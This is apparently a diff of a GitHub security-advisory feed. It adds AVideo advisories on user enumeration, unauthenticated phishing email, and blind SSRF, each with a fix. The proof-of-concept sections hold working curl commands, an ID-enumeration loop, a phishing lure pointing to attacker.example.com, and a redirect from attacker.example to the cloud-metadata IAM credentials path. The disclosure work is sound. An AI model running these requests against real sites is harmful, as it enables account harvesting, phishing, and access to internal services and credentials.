+<h3 id="why-there-is-no-blocking-mitigation">Why there is no blocking mitigation</h3>
+<ul>
+<li>No router-level auth: the <code>.htaccess</code> rewrite (<code>.htaccess:317</code>) maps <code>/users.json</code> directly to this file.</li>
+<li>No CSRF/origin gate: the file is explicitly listed in <code>objects/functionsSecurity.php:893</code> under “Read-only endpoints that accept POST params”, meaning the same-origin/CSRF middleware is skipped by design.</li>
+<li>The output-filter block (<code>objects/users.json.php:66-77</code>) only limits <strong>which</strong> fields are echoed — it does not suppress existence or display-name leakage, and <code>total</code> is always echoed on line 97.</li>
+<li><code>rowCount</code> is attacker-controlled with no upper bound (line 17-18 only sets a default of 10).</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<p>Target: a default AVideo 29.0 install at <code>http://target/</code>. No session cookie, no CSRF token, no API key required.</p>
+<h3 id="path-1--bulk-listing-via-iscompany-admin-check-bypass">Path 1 — bulk listing via <code>isCompany</code> admin-check bypass</h3>
+<pre><code>$ curl -s 'http://target/objects/users.json.php?isCompany=0&amp;rowCount=1000&amp;current=1'
+{"current":1,"rowCount":1000,"total":42,"rows":[
+  {"id":"1","identification":"admin","photo":"https://target/videos/userPhoto/photo1.png",
+   "background":"https://target/...","status":"a","creator":"&lt;div ...channel URL...&gt;"},
+  {"id":"2","identification":"alice",...,"status":"a",...},
+  ...
+]}
+</code></pre>
+<p>The same call with <code>isCompany=1</code> returns the subset of company-flagged users; <code>isCompany=0</code> returns all non-company users. Both branches set <code>$ignoreAdmin = true</code>.</p>
+<h3 id="path-2--sequential-id-existence--display-name-oracle">Path 2 — sequential-ID existence / display-name oracle</h3>
+<pre><code>$ for i in $(seq 1 10000); do
+    curl -s "http://target/objects/users.json.php?users_id=$i" \
+      | jq -r '[.total, .rows[0].id, .rows[0].identification, .rows[0].status] | @tsv'
+  done
+1	1	admin	a
+1	2	alice	a
+0	null	null	null
+1	4	bob	i
+...
+</code></pre>
+<p><code>total=1</code> → ID exists; <code>identification</code> field leaks the login/display name; <code>status</code> reveals active (<code>a</code>) vs inactive (<code>i</code>).</p>
+<h3 id="verification-of-the-branch-logic">Verification of the branch logic</h3>
+<pre><code class="language-php">// Reproduces objects/users.json.php:39-48 for an unauthenticated attacker.
+$canAdminUsers = false; $ignoreAdmin = false;
+$_SESSION = [];                      // unauthenticated
+$_REQUEST = ['isCompany' =&gt; '1'];
+if (isset($_REQUEST['isCompany'])) {
+    $isCompany = intval($_REQUEST['isCompany']);
+    if (!$canAdminUsers) {
+        $isACompany = !empty($_SESSION['user']['is_company']);   // false
+        $isCompany   = $isACompany ? 0 : 1;
+        $ignoreAdmin = true;
+    }
+}
+var_dump($isCompany, $ignoreAdmin);  // int(1) bool(true)  → admin guard SKIPPED
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated remote attacker can:</p>
+<ul>
+<li>Enumerate every user account on the platform (display names, numeric IDs, channel URLs/usernames, active/inactive status, profile photo/background URLs).</li>
+<li>Obtain the total registered-user count, useful for platform sizing and post-compromise reporting.</li>
+<li>Build a targeted username list for credential stuffing, password spraying, or phishing against AVideo’s login/password-recovery endpoints.</li>
+<li>Cross-reference leaked display names against the known password-recovery oracle to identify valid targets.</li>
+</ul>
+<p>No auth is required, the request is a single unauthenticated <code>GET</code>, and <code>rowCount</code> is unbounded, so the full user list can be harvested in one request.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<ol>
+<li><p>Require authentication at the top of <code>objects/users.json.php</code>, and gate the bulk-listing path to users who legitimately need to search:</p>
+<pre><code class="language-php">require_once $global['systemRootPath'] . 'objects/user.php';
+User::loginCheck();                         // reject anonymous callers
+if (!canSearchUsers()) {
+    header('HTTP/1.1 403 Forbidden');
+    die('{"error":"forbidden"}');
+}
+</code></pre>
+</li>
+<li><p>Remove the <code>isCompany</code>-driven <code>$ignoreAdmin = true</code> branch (users.json.php:41-48). It served no purpose that the explicit <code>canSearchUsers()</code> check above does not already cover, and its only observable effect is the bypass described here.</p>
+</li>
+<li><p>Gate the <code>users_id</code> path behind the same check, or restrict its output to the caller’s own record when the caller is not an admin:</p>
+<pre><code class="language-php">if (!empty($_REQUEST['users_id'])) {
+    $requestedId = intval($_REQUEST['users_id']);
+    if (!canSearchUsers() &amp;&amp; $requestedId !== User::getId()) {
+        header('HTTP/1.1 403 Forbidden');
+        die('{"error":"forbidden"}');
+    }
+    $user = User::getUserFromID($requestedId);
+    ...
+}
+</code></pre>
+</li>
+<li><p>Consider clamping <code>$_REQUEST['rowCount']</code> to a sane ceiling (e.g. 100) and removing <code>objects/users.json.php</code> from the CSRF-bypass list in <code>objects/functionsSecurity.php:893</code> unless there is a specific mobile-client requirement — and if there is, route it through an authenticated API token instead of making the endpoint anonymously reachable.</p>
+</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-6rvw-7p8v-mjfq">https://github.com/WWBN/AVideo/security/advisories/GHSA-6rvw-7p8v-mjfq</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/d9cdc702481a626b15f814f6093f1e2a9c20d375">https://github.com/WWBN/AVideo/commit/d9cdc702481a626b15f814f6093f1e2a9c20d375</a></li>
+<li><a href="https://github.com/advisories/GHSA-6rvw-7p8v-mjfq">https://github.com/advisories/GHSA-6rvw-7p8v-mjfq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6rvw-7p8v-mjfq</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T22:02:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo: Unauthenticated Arbitrary Email Sending via sendEmail.json.php Enables Phishing from the Site’s Legitimate From Address]]></title>
+        <id>https://github.com/advisories/GHSA-5hgj-7gm9-cff5</id>
+        <link href="https://github.com/advisories/GHSA-5hgj-7gm9-cff5"/>
+        <updated>2026-05-05T21:56:21.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>objects/sendEmail.json.php</code> exposes two branches depending on whether <code>contactForm=1</code> is submitted. When the parameter is omitted, the endpoint sets <code>$sendTo</code> to an attacker-supplied email and, for unauthenticated callers, uses the site's own contact email as the message <code>From:</code>/<code>Reply-To:</code>. The endpoint is explicitly allow-listed as a "public write action" in <code>objects/functionsSecurity.php</code> (line 885), so it requires no authentication or CSRF token. An unauthenticated attacker (solving a captcha) can force the site's own SMTP infrastructure to send attacker-composed emails to arbitrary recipients with the site's legitimate sender address, passing SPF/DKIM/DMARC for the site's domain — ideal for targeted phishing and brand impersonation.</p>
+<h2 id="details">Details</h2>
+<p><strong>Vulnerable code (<code>objects/sendEmail.json.php</code>):</strong></p>
+<pre><code class="language-php">10: $valid = Captcha::validation(@$_POST['captcha']);
+11: if(User::isAdmin()){
+12:     $valid = true;
+13: }
+...
+16: if ($valid) {
+...
+24:     $mail = new \PHPMailer\PHPMailer\PHPMailer();
+25:     setSiteSendMessage($mail);           // uses site's SMTP credentials
+...
+30:     $replyTo = User::getEmail_();
+31:     if (empty($replyTo)) {
+32:         $replyTo = $config-&gt;getContactEmail();   // &lt;-- FALLBACK to site's own email
+33:     }
+34:
+35:     $sendTo = $_POST['email'];            // attacker-controlled recipient
+36:
+37:     // if it is from contact form send the message to the siteowner and the sender is the email on the form field
+38:     if (!empty($_POST['contactForm'])) {
+39:         $replyTo = $_POST['email'];
+40:         $sendTo  = $config-&gt;getContactEmail();
+41:     }
+42:
+43:     if (filter_var($sendTo, FILTER_VALIDATE_EMAIL)) {
+44:         $mail-&gt;AddReplyTo($replyTo);       // site's address
+45:         $mail-&gt;setFrom($replyTo);          // From: site's address
+...
+47:         $mail-&gt;addAddress($sendTo);        // TO: attacker-chosen victim
+...
+49:         $safeFirstName = htmlspecialchars($_POST['first_name'], ENT_QUOTES, 'UTF-8');
+50:         $mail-&gt;Subject = 'Message From Site ' . $config-&gt;getWebSiteTitle() . " ({$safeFirstName})";
+51:         $mail-&gt;msgHTML($msg);
+...
+55:         if (!$mail-&gt;send()) { ... }
+</code></pre>
+<p><strong><code>User::getEmail_()</code> (<code>objects/user.php:345-352</code>):</strong> returns <code>''</code> when the caller is not logged in, driving the fallback to <code>$config-&gt;getContactEmail()</code>.</p>
+<p><strong>Endpoint is publicly callable.</strong> <code>objects/functionsSecurity.php:879-918</code> lists <code>sendEmail.json.php</code> in the built-in "public write actions" CSRF/same-domain bypass:</p>
+<pre><code class="language-php">static $builtinBypass = [
+    ...
+    // Public write actions
+    'sendEmail.json.php',
+    ...
+];
+if (in_array($baseName, $builtinBypass, true)) { return; }
+</code></pre>
+<p><strong>Why existing defenses don't mitigate the abuse:</strong></p>
+<ul>
+<li><strong>Captcha</strong> (<code>Captcha::validation</code>): costs one solve per email. Manual solves remain viable for targeted phishing, and a separate captcha-bypass primitive in this codebase (tracked separately) automates abuse.</li>
+<li><strong><code>FILTER_VALIDATE_EMAIL</code></strong> (line 43): validates <code>$sendTo</code> format, preventing CRLF/header injection, but does not verify that the sender is authorized to send to that address.</li>
+<li><strong><code>htmlspecialchars</code> on <code>$safeEmail</code>/<code>$safeComment</code>/<code>$safeFirstName</code></strong>: blocks HTML injection in the rendered message but does not prevent phishing content — attacker fully controls the visible text (URL, instructions) and the perceived sender.</li>
+<li><strong>No rate limiting, no auth check, no association between the caller and the recipient address.</strong></li>
+</ul>
+<p><strong>Flow summary for the abuse case (unauthenticated, no <code>contactForm</code>):</strong></p>
+<ol>
+<li><code>User::getEmail_()</code> → <code>''</code>, so <code>$replyTo</code> = site's contact email (line 32)</li>
+<li><code>$sendTo</code> = attacker's chosen recipient (line 35)</li>
+<li><code>contactForm</code> branch skipped (line 38)</li>
+<li>Site's SMTP sends <code>From: &lt;site contact&gt;</code> to <code>&lt;victim&gt;</code> with attacker's subject/body (lines 44-51)</li>
+</ol>
+<p>Because the message is genuinely relayed by the site's mail infrastructure, SPF/DKIM/DMARC for the site's domain pass, making the phishing message indistinguishable from legitimate site mail.</p>
+<h2 id="poc">PoC</h2>
+<p>Endpoint: <code>POST /objects/sendEmail.json.php</code> (also reachable via <code>POST /sendEmail</code> per <code>.htaccess:201</code>).</p>
+<pre><code class="language-bash"># 1. Obtain a session + captcha image
+curl -c cookies.txt -s 'http://target.example.com/captcha.php?refresh=1' -o captcha.png
+# attacker manually solves the captcha -&gt; e.g. 'abc123'
+
+# 2. Send phishing email. Note: contactForm is OMITTED.
+#    - User::getEmail_() returns '' (unauth) -&gt; $replyTo falls back to site's contact email
+#    - $sendTo = attacker-chosen recipient
+#    - setFrom($replyTo) -&gt; From: is the site's real address
+curl -b cookies.txt -s -X POST 'http://target.example.com/objects/sendEmail.json.php' \
+  --data-urlencode 'captcha=abc123' \
+  --data-urlencode 'email=victim@target.com' \
+  --data-urlencode 'first_name=Support Team' \
+  --data-urlencode 'comment=Urgent: Your account will be suspended. Please verify at http://attacker.example.com/reset'
+</code></pre>
+<p>Expected server response:</p>
+<pre><code class="language-json">{"error":"","success":"Message sent"}
+</code></pre>
+<p>Delivered headers at <code>victim@target.com</code>:</p>
+<pre><code>From: &lt;site's legitimate contact email, e.g. contact@legit-videosite.com&gt;
+Reply-To: &lt;site's legitimate contact email&gt;
+To: victim@target.com
+Subject: Message From Site &lt;SiteName&gt; (Support Team)
+Body:   &lt;b&gt;Email:&lt;/b&gt; victim@target.com&lt;br&gt;&lt;br&gt;Urgent: Your account will be suspended...
+</code></pre>
+<p>Contrast with the intended <code>contactForm=1</code> flow (correctly routes to the site owner):</p>
+<pre><code class="language-bash">curl -b cookies.txt -s -X POST 'http://target.example.com/objects/sendEmail.json.php' \
+  --data-urlencode 'captcha=&lt;newcaptcha&gt;' \
+  --data-urlencode 'email=attacker@attacker.com' \
+  --data-urlencode 'comment=hi' \
+  --data-urlencode 'contactForm=1'
+# -&gt; $sendTo = site owner's contact email; $replyTo = attacker's email. (Normal contact form.)
+</code></pre>
+<p>Omitting <code>contactForm</code> inverts the routing and turns the endpoint into an unauthenticated sender-for-hire using the site's own From: identity.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Phishing with the site's real sender identity.</strong> Mail originates from the site's SMTP, so SPF/DKIM/DMARC pass; the message is indistinguishable from legitimate site communications and bypasses inbox anti-phishing heuristics.</li>
+<li><strong>Brand impersonation / account-takeover chains.</strong> Attacker-controlled subject (<code>first_name</code>) and body (<code>comment</code>) support credential-harvesting pages that appear to come from the site operator.</li>
+<li><strong>Mail-reputation damage.</strong> Repeated abuse can blacklist the site's sending IP/domain, degrading legitimate mail deliverability.</li>
+<li><strong>Works against any AVideo instance with SMTP configured</strong> — a default deployment after the admin configures SMTP for standard notifications. No privileged position, credentials, or non-default flags required.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Collapse the endpoint to contact-owner-only behavior and require either authentication or <code>contactForm=1</code>. Minimal patch:</p>
+<pre><code class="language-php">// objects/sendEmail.json.php
+...
+$valid = Captcha::validation(@$_POST['captcha']);
+if (User::isAdmin()) {
+    $valid = true;
+}
+
+// Reject the non-contactForm branch for unauthenticated callers.
+// The "share with a friend" flow already requires User::isLogged()
+// in the UI (view/.../functiongetShareMenu.php), so enforce it here too.
+if (empty($_POST['contactForm']) &amp;&amp; !User::isLogged()) {
+    $obj = new stdClass();
+    $obj-&gt;error = __("Authentication required");
+    header('Content-Type: application/json');
+    echo json_encode($obj);
+    exit;
+}
+
+$obj = new stdClass();
+$obj-&gt;error = '';
+if ($valid) {
+    ...
+    $replyTo = User::getEmail_();
+    if (empty($replyTo)) {
+        // Should no longer be reachable for arbitrary recipients.
+        // Keep as defense-in-depth only for contactForm=1 path.
+        $replyTo = $config-&gt;getContactEmail();
+    }
+    ...
+}
+</code></pre>
+<p>Additional hardening:</p>
+<ol>
+<li>Always use a dedicated <code>no-reply@</code> address in <code>setFrom()</code>; put the caller's address only in <code>Reply-To</code>. Never reuse <code>$config-&gt;getContactEmail()</code> as the From for user-initiated messages.</li>
+<li>For the logged-in "share" flow, verify the caller's email has been confirmed, and rate-limit by user id and by IP.</li>
+<li>Drop the non-<code>contactForm</code> branch entirely if no legitimate unauthenticated UI caller remains.</li>
+<li>Add a visible "user-submitted message via our site" banner to the email body so recipients can distinguish these from first-party communications.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-5hgj-7gm9-cff5">https://github.com/WWBN/AVideo/security/advisories/GHSA-5hgj-7gm9-cff5</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/4e3709895857a5857f0edb46b0ee984de0d9e1a2">https://github.com/WWBN/AVideo/commit/4e3709895857a5857f0edb46b0ee984de0d9e1a2</a></li>
+<li><a href="https://github.com/advisories/GHSA-5hgj-7gm9-cff5">https://github.com/advisories/GHSA-5hgj-7gm9-cff5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5hgj-7gm9-cff5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T21:56:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo has Blind SSRF in YPTWallet Donation Webhook via Missing isSSRFSafeURL() Check and CURLOPT_FOLLOWLOCATION Redirect Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-wp38-whx3-xffh</id>
+        <link href="https://github.com/advisories/GHSA-wp38-whx3-xffh"/>
+        <updated>2026-05-05T21:49:25.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An authenticated user can configure their own donation-notification webhook URL to point at internal/loopback/metadata hosts (e.g. <code>http://127.0.0.1:8080/...</code>, <code>http://169.254.169.254/latest/...</code>, RFC1918 addresses). When any other user (including a second account owned by the same attacker) donates even a trivial amount via <code>plugin/CustomizeUser/donate.json.php</code>, the AVideo server issues a <code>curl</code> POST to the attacker-supplied URL, resulting in a blind SSRF. The handler uses only <code>isValidURL()</code> (which is a format check) and does not call the codebase's own <code>isSSRFSafeURL()</code> helper. Additionally, <code>CURLOPT_FOLLOWLOCATION</code> is enabled with no per-hop revalidation, so even if the stored URL were validated, an HTTP 307 from an attacker-controlled host could redirect the POST to internal targets.</p>
+<h2 id="details">Details</h2>
+<h3 id="sink-unvalidated-curl-post-in-afterdonation">Sink: unvalidated curl POST in afterDonation</h3>
+<p><code>plugin/YPTWallet/YPTWallet.php:1043-1099</code></p>
+<pre><code class="language-php">public function afterDonation($from_users_id, $how_much, $videos_id, $users_id, $extraParameters)
+{
+    ...
+    $donation_notification_url = self::getDonationNotificationURL($users_id);
+    ...
+    if (!empty($donation_notification_url) &amp;&amp; isValidURL($donation_notification_url)) {
+        ...
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $donation_notification_url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+        curl_setopt($ch, CURLOPT_NOSIGNAL, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);   // line 1081
+        ...
+        ob_start();
+        curl_exec($ch);
+        ob_end_clean();
+</code></pre>
+<p>The gate at line 1064 is <code>isValidURL()</code> only. That helper is a pure format check:</p>
+<p><code>objects/functions.php:4305-4315</code></p>
+<pre><code class="language-php">function isValidURL($url)
+{
+    if (empty($url) || !is_string($url)) {
+        return false;
+    }
+    if (preg_match("/^http.*/", $url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL)) {
+        return true;
+    }
+    return false;
+}
+</code></pre>
+<p>It does not reject <code>http://127.0.0.1</code>, <code>http://169.254.169.254</code>, RFC1918 ranges, or hostnames that resolve to private IPs.</p>
+<p>The project already ships a correct SSRF guard at <code>objects/functions.php:4366</code> (<code>isSSRFSafeURL()</code>), which performs scheme allow-listing, hostname-to-IP resolution, loopback blocking, RFC1918 / link-local / metadata blocking, and IPv4-mapped IPv6 normalization. It is not used here.</p>
+<h3 id="storage-path-has-no-ssrf-validation">Storage path has no SSRF validation</h3>
+<p><code>plugin/YPTWallet/view/saveConfiguration.php:31-33</code></p>
+<pre><code class="language-php">if(isset($_REQUEST['donation_notification_url'])){
+     $obj-&gt;donation_notification_url = YPTWallet::setDonationNotificationURL(User::getId(), $_REQUEST['donation_notification_url']);
+}
+</code></pre>
+<p><code>plugin/YPTWallet/YPTWallet.php:1015-1034</code></p>
+<pre><code class="language-php">static function setDonationNotificationURL($users_id, $url)
+{
+    $url = trim($url);
+    $url = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $url);
+    $url = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
+    if (strlen($url) &gt; 2048) { ... }
+    $user = new User($users_id);
+    return $user-&gt;addExternalOptions('donation_notification_url', $url);
+}
+</code></pre>
+<p>No host/IP/scheme validation. A value like <code>http://127.0.0.1:8080/internal</code> contains none of <code>&amp; &lt; &gt; " '</code>, so <code>htmlspecialchars</code> preserves it verbatim.</p>
+<h3 id="trigger">Trigger</h3>
+<p><code>plugin/CustomizeUser/donate.json.php:88,108</code></p>
+<pre><code class="language-php">if (YPTWallet::transferBalance(User::getId(), $video-&gt;getUsers_id(), $value, ...)) {
+    ...
+    AVideoPlugin::afterDonation(User::getId(), $value, $videos_id, 0, $obj-&gt;extraParameters);
+}
+...
+if (YPTWallet::transferBalance(User::getId(), $users_id, $value, ...)) {
+    ...
+    AVideoPlugin::afterDonation(User::getId(), $value, 0, $users_id, $obj-&gt;extraParameters);
+}
+</code></pre>
+<p>Donor must have wallet balance; captcha is required unless <code>disableCaptchaOnWalletDirectTransferDonation</code> is set. An attacker can use two accounts they control: the recipient configures the webhook, the donor (any balance they obtained) triggers the call with a trivial transfer.</p>
+<h3 id="followlocation-bypass">FOLLOWLOCATION bypass</h3>
+<p>Even if <code>isSSRFSafeURL()</code> were added to the upfront check on the stored URL, <code>CURLOPT_FOLLOWLOCATION=true</code> with no per-redirect host validation allows the attacker to point the webhook at an external host they control and return HTTP 307, which preserves the POST method and forwards the body to e.g. <code>http://169.254.169.254/latest/...</code> or any RFC1918 endpoint.</p>
+<h3 id="what-escapes-to-the-internal-request">What escapes to the internal request</h3>
+<p>The POST body is <code>http_build_query($data)</code> where <code>$data</code> contains <code>from_users_id</code>, <code>from_users_name</code>, <code>currency</code>, <code>how_much_human</code>, <code>how_much</code>, <code>message</code> (attacker-controlled from the donate.json.php request), <code>videos_id</code>, <code>users_id</code>, <code>time</code>, and <code>extraParameters</code>. Headers include <code>X-Webhook-Signature: sha256=...</code> and <code>X-Webhook-Timestamp</code>. The response is discarded (<code>ob_start</code> / <code>ob_end_clean</code>, return value ignored), so this is a <strong>blind</strong> SSRF — exfiltration must use out-of-band channels.</p>
+<h2 id="poc">PoC</h2>
+<p>Prerequisites: two authenticated accounts on the target — Alice (attacker/recipient of donation) and Bob (attacker's second account with a small wallet balance). Captcha is assumed enabled (default).</p>
+<p>Step 1 — Alice stores an internal-host webhook URL. No CSRF token is required on this endpoint:</p>
+<pre><code class="language-bash">curl -sS -b cookies_alice.txt -X POST 'https://target/plugin/YPTWallet/view/saveConfiguration.php' \
+  --data-urlencode 'donation_notification_url=http://127.0.0.1:8080/internal/admin/action' \
+  --data-urlencode 'CryptoWallet='
+</code></pre>
+<p>Response body includes the stored <code>donation_notification_url</code> plus Alice's <code>webhook_secret</code> (the signature is computed with Alice's own secret, so there is no cross-user signature leak).</p>
+<p>Step 2 — Start a listener on the target host to observe the blind request:</p>
+<pre><code class="language-bash"># On the target server
+nc -lvp 8080
+</code></pre>
+<p>Step 3 — Bob donates the minimum amount to Alice (captcha solved):</p>
+<pre><code class="language-bash">curl -sS -b cookies_bob.txt -X POST 'https://target/plugin/CustomizeUser/donate.json.php' \
+  --data 'value=0.01&amp;users_id=&lt;alice_user_id&gt;&amp;message=x&amp;captcha=&lt;solved_value&gt;'
+</code></pre>
+<p><code>donate.json.php:108</code> calls <code>AVideoPlugin::afterDonation(...)</code>.</p>
+<p>Step 4 — Observe the netcat listener: the AVideo server issues:</p>
+<pre><code>POST /internal/admin/action HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: &lt;AVideo UA&gt;
+Content-Type: application/x-www-form-urlencoded
+X-Webhook-Signature: sha256=&lt;hmac&gt;
+X-Webhook-Timestamp: &lt;epoch&gt;
+Content-Length: ...
+
+from_users_id=&lt;bob&gt;&amp;from_users_name=...&amp;currency=...&amp;how_much_human=...&amp;how_much=0.01&amp;message=x&amp;videos_id=0&amp;users_id=&lt;alice&gt;&amp;time=...&amp;extraParameters[...]=...
+</code></pre>
+<p>Confirmed: the vulnerable server reaches the loopback port on behalf of the attacker.</p>
+<p>Step 5 — FOLLOWLOCATION bypass. Alice registers an external URL she controls:</p>
+<pre><code class="language-bash">curl -sS -b cookies_alice.txt -X POST 'https://target/plugin/YPTWallet/view/saveConfiguration.php' \
+  --data-urlencode 'donation_notification_url=https://attacker.example/r' \
+  --data-urlencode 'CryptoWallet='
+</code></pre>
+<p>Alice's web server at <code>attacker.example/r</code> responds to the POST with:</p>
+<pre><code>HTTP/1.1 307 Temporary Redirect
+Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</code></pre>
+<p>Because <code>CURLOPT_FOLLOWLOCATION=true</code> and HTTP 307 preserves method, the AVideo host re-issues the POST to the cloud metadata endpoint. This demonstrates that any future fix that only validates the stored URL (without disabling follow-redirects or validating each hop) remains bypassable.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Blind SSRF from authenticated low-privileged users.</strong> An attacker reaches internal-only network resources from the AVideo server: loopback services, RFC1918 hosts on the same VPC, cloud metadata endpoints, and any other host the AVideo server can route to.</li>
+<li><strong>State-changing POST to internal endpoints.</strong> Because the request method is fixed to POST and the body is attacker-influenced (the <code>message</code> field is user-supplied), an attacker can trigger POST-handled internal admin endpoints, Redis/memcached HTTP-ish consoles, or webhook receivers that accept arbitrary POST bodies.</li>
+<li><strong>Cloud metadata reachability via 307 redirect chain.</strong> Follow-location support enables redirection into RFC1918 / 169.254.169.254 even if stored-URL validation is later added. Metadata endpoints that accept POST (or GET-via-redirect once the chain involves a 302/303 downgrade) become reachable.</li>
+<li><strong>Blindness limits direct data exfiltration</strong> (the response is discarded) but does not prevent state-changing requests, port-probe timing, or DNS-rebinding timing side channels.</li>
+<li><strong>No CSRF protection</strong> on <code>saveConfiguration.php</code>, so this can also be compounded with a forced-browsing or CSRF vector against an authenticated user to plant the webhook on a victim's account.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<ol>
+<li>Call <code>isSSRFSafeURL()</code> on both the store path and the dispatch path. In <code>plugin/YPTWallet/YPTWallet.php:1015</code> (setter) and line 1064 (dispatcher), replace:</li>
+</ol>
+<pre><code class="language-php">if (!empty($donation_notification_url) &amp;&amp; isValidURL($donation_notification_url)) {
+</code></pre>
+<p>with:</p>
+<pre><code class="language-php">$resolvedIP = null;
+if (!empty($donation_notification_url) &amp;&amp; isSSRFSafeURL($donation_notification_url, $resolvedIP)) {
+</code></pre>
+<p>and reject the URL in <code>setDonationNotificationURL()</code> before persisting:</p>
+<pre><code class="language-php">static function setDonationNotificationURL($users_id, $url)
+{
+    $url = trim($url);
+    $url = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $url);
+    if (!isSSRFSafeURL($url)) {
+        _error_log("setDonationNotificationURL: rejected SSRF-unsafe URL for user {$users_id}");
+        return false;
+    }
+    if (strlen($url) &gt; 2048) { ... }
+    $url = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
+    ...
+}
+</code></pre>
+<ol start="2">
+<li>Disable automatic redirect following, or implement per-hop validation. Either:</li>
+</ol>
+<pre><code class="language-php">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+</code></pre>
+<p>Or use <code>CURLOPT_REDIR_PROTOCOLS</code> limited to <code>CURLPROTO_HTTP | CURLPROTO_HTTPS</code> <strong>and</strong> pin DNS via <code>CURLOPT_RESOLVE</code> using the <code>$resolvedIP</code> from <code>isSSRFSafeURL()</code>, then follow redirects manually by re-validating each <code>Location:</code> header with <code>isSSRFSafeURL()</code> before re-issuing the request.</p>
+<ol start="3">
+<li>Add DNS-pinning to defeat DNS rebinding between the validation and the curl call:</li>
+</ol>
+<pre><code class="language-php">$parts = parse_url($donation_notification_url);
+$port = $parts['port'] ?? (($parts['scheme'] ?? 'http') === 'https' ? 443 : 80);
+curl_setopt($ch, CURLOPT_RESOLVE, ["{$parts['host']}:{$port}:{$resolvedIP}"]);
+</code></pre>
+<ol start="4">
+<li>Add a CSRF/global-token check on <code>plugin/YPTWallet/view/saveConfiguration.php</code> (consistent with the token validation added elsewhere in the codebase in commit <code>11e7804f7</code>) to prevent webhook planting via CSRF on a victim's authenticated session.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-wp38-whx3-xffh">https://github.com/WWBN/AVideo/security/advisories/GHSA-wp38-whx3-xffh</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/aaacd48f29f1ff71d1eb5fc81d37605f593cefa9">https://github.com/WWBN/AVideo/commit/aaacd48f29f1ff71d1eb5fc81d37605f593cefa9</a></li>
+<li><a href="https://github.com/advisories/GHSA-wp38-whx3-xffh">https://github.com/advisories/GHSA-wp38-whx3-xffh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wp38-whx3-xffh</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T21:49:23.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[getgrav/grav] Grav is Vulnerable to Stored XSS via Tag Injection]]></title>
         <id>https://github.com/advisories/GHSA-w8cg-7jcj-4vv2</id>
@@ -1469,465 +2344,5 @@ foreach ($allowedFields as $field) {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-05T21:20:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib has a CVE-2024-27355 mitigation bypass — OID amplification DoS in ASN1::decodeOID()]]></title>
-        <id>https://github.com/advisories/GHSA-3qpq-r242-jqj7</id>
-        <link href="https://github.com/advisories/GHSA-3qpq-r242-jqj7"/>
-        <updated>2026-05-05T21:17:58.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Anyone loading untrusted ASN1 files (eg. X509 certificates, RSA PKCS8 private or public keys, etc)</p>
-<h3 id="patches">Patches</h3>
-<p><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>No.</p>
-<h3 id="references">References</h3>
-<p><a href="https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc">https://github.com/phpseclib/phpseclib/commit/d53d2021bcb9f6a04d5d44ec99e6bbef219a71bc</a></p>
-<h3 id="references-1">References</h3>
-<ul>
